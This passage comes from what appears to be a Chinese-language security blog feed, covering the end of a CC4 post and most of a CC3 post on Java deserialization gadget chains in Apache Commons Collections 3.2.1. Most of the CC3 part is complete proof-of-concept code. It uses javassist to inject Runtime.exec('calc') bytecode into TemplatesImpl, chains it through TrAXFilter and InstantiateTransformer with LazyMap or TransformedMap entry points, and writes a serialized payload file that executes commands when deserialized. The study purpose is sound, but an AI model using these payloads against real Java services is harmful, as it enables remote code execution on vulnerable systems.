class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc4payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc4payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/e3ecc659/cc4-6.png" title="实现demo"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>cc4简述就是cc3中触发代码替换cc2中的触发代码，由于触发代码的改变，无需向队列添加元素，使用比较器时自动触发，比较好理解。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC3链学习与分析</title>
      <link href="/posts/a9d24d12.html"/>
      <url>/posts/a9d24d12.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1、CC2过完，后面的链相对来说就容易理解很多，就是再利用链上变种调用其他类方法进行实现，继续往后面学吧。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（8u71版本之前，8u71之后漏洞已修复）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC1、CC2后的链基本就是正向分析，因为在CC1&#x2F;2中的大部分逆向分析思路已经分析过了，后续的链基本就是在前面的链上面交换利用类和方法实现同一个效果。</p><p>先明确的CC3链使用的东西：LazyMap动态代理、javassist字节码、TemplatesImpl字节码转换成类、PriorityQueue优先级队列，相当于把cc1和cc2串起来用了。</p><p>简述CC1、CC2的实现流程</p><p>CC1（LazyMap链）：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将<code>LazyMap</code>对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><p>CC2（TemplatesImpl）：</p><ul><li>通过反射调用<code>InvokerTransformer</code>构造方法传递方法名<code>getOutputProperties/newTransformer</code>。</li><li>通过<code>javassist</code>生成恶意代码的字节码。</li><li>通过<code>TemplatesImpl</code>将字节码转化成类。</li><li>将反射<code>InvokerTransformer</code>对象作为比较器传递入<code>PriorityQueue</code>优先级队列。</li><li>将<code>TemplatesImpl</code>对象元素添加入<code>PriorityQueue</code>队列。</li><li>在比较器进行元素比较时触发<code>TemplatesImpl</code>的<code>getOutputProperties/newTransformer</code>方法，触发漏洞。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先不直接给出cc3的poc，先看下调用变化，尽可能逆向思维分析。</p><p>主体上还是使用了<code>javassist</code>&amp;<code>TemplatesImpl</code>，生成恶意字节码再转化字节码解析成类进行调用，在分析CC2的时候提到调用<code>TemplatesImpl</code>的（<code>getOutputProperties()</code>或者<code>newTransformer()</code>）方法。</p><p>其中<code>getOutputProperties()</code>方法是<code>newTransformer()</code>的本类的上层调用，其中<code>newTransformer()</code>还有其他类的调用在CC2分析中过掉了，再看看其他类的调用情况</p><p><img src="/posts/a9d24d12/cc3-1.png" title="newTransformer调用"></p><p>发现除了cc2利用链的<code>getOutputProperties()</code>方法外，还剩3个方法（<code>TransformerFactoryImpl.newTransformer()</code>、<code>TransformerFactoryImpl.newTransformerHandler()</code>、<code>TrAXFilter.TrAXFilter()</code>）</p><p>其中<code>TransformerFactoryImpl.newTransformer()</code>和<code>TransformerFactoryImpl.newTransformerHandler()</code>方法都是<code>TransformerFactoryImpl</code>类的方法，要调用该两个方法，首先得创建该类的实例，再去调用这两个方法，其次，<code>TransformerFactoryImpl</code>类并未实现序列化接口，该类的实例无法直接进行序列化，只能通过其他类进行调用，向上未发现能形成链的调用类。</p><p><img src="/posts/a9d24d12/cc3-2.png" title="TransformerFactoryImpl"></p><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>剩下还有一个<code>TrAXFilter.TrAXFilter()</code>方法，TrAXFilter()方法是TrAXFilter类的构造方法。</p><p>该类的描述</p><blockquote><p>XMLFilterImpl的骨架扩展</p></blockquote><p><img src="/posts/a9d24d12/cc3-3.png" title="TrAXFilter方法"></p><p>该类通过将<code>Templates</code>对象作为参数传递进构造方法，且没有其他条件，这里进行了强制转换成<code>TransformerImpl</code>类，进而直接调用<code>(TransformerImpl)Templates.newTransformer()</code>方法</p><p>因此通过构造函数带参实例化<code>TrAXFilter</code>类对象，就能执行恶意代码。</p><p>但由于<code>TrAXFilter</code>类并未实现序列化，因此该类无法直接实例化对象并序列化来执行恶意代码，需要找到一个能实例化该类的方法。</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>到这确实没法通过逆向思维找到对应调用<code>TrAXFilter类</code>的实例化方法，这里就只有正向分析学习一下。</p><p>该类的描述</p><blockquote><p>通过反射创建新对象实例的Transformer实现</p></blockquote><p>其中构造方法传递两个参数，一个<code>class[]</code>类数组的参数，代表参数类型，一个<code>object[]</code>对象类数组的参数，代表参数值</p><p><img src="/posts/a9d24d12/cc3-4.png" title="InstantiateTransformer"></p><p>其中存在transform方法</p><p><img src="/posts/a9d24d12/cc3-5.png" title="transform"></p><p>这里会先判断传入的input对象是否是Class实例，不是的话直接抛出该类不是Class实例的异常异常，所以这里也必须使用反射传递进来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>随后通过调用input对象的带参构造方法，并传递iArgs对象通过newInstance进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure><p>这里就利用到cc1链中的<code>ChainedTransformer</code>类的方法把<code>TrAXFilter</code>和<code>InstantiateTransformer</code>串起来，通过<code>TrAXFilter</code>反射对象<code>input</code>参数传递入<code>InstantiateTransformer.transform(input)</code>将<code>TrAXFilter</code>对象进行实例化，调用<code>TrAXFilter</code>构造方法中的<code>TransformerImpl.newTransformer</code>，形成完整的利用链。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>主体没变，依然把cc2中的 <code>javassist</code>生成恶意代码的字节码和<code>TransformerImpl</code>转化字节码为实例类 的代码段搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>恶意字节码以及转化实例的代码有了，接下来就是找到调用，通过<code>TrAXFilter</code>和<code>InstantiateTransformer</code>串联起来作为触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接下来使用CC1中的LazyMap链的后半段通过动态代理调用invoke方法执行<code>transformerChain.transform()</code>作为序列化入口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line"><span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line"><span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line"><span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br></pre></td></tr></table></figure><p>最后进行序列化和反序列化触发漏洞。</p><p>最后的POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        <span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//创建代理InvocationHandler对象调用AnnotationInvocationHandler类</span></span><br><span class="line">        InvocationHandler invohandler=(InvocationHandler)declaredConstructor.newInstance(Generated.class,Lmap);</span><br><span class="line">        <span class="comment">//创建proxy代理对象，参数分别为Map加载器、Map类数组、InvocationHandler对象invohandler</span></span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invohandler);</span><br><span class="line">        <span class="comment">//通过代理调用代理对象，执行invoke方法</span></span><br><span class="line">        InvocationHandler invohandlerproxy=(InvocationHandler)declaredConstructor.newInstance(Generated.class,proxymap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc3payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(invohandlerproxy);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc3payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/a9d24d12/cc3-7.png" title="执行实现"></p><h2 id="CC3延伸TransformedMap"><a href="#CC3延伸TransformedMap" class="headerlink" title="CC3延伸TransformedMap"></a>CC3延伸TransformedMap</h2><p>上述的CC3-POC主要还是加载字节码+LazyMap，在CC1链学习中学到CC1链有LazyMap链还有一条TransformedMap链，且加载字节码主体不变，触发方式也是去调用ChainedTransformer的串联方法。那也同理，可以使用TransformedMap链作为入口点。</p><p>构造POC：<br>同理，加载字节码主体不变，直接搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>加载字节码有了，现在就是触发字节码的部分，也是ChainedTransformer类的串联方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>触发方式有了，现在就是找到反序列化入口，即CC1的TransformedMap入口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br></pre></td></tr></table></figure><p>最后就是对obj对象进行序列化和反序列化触发利用。</p><p>得到完整代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span 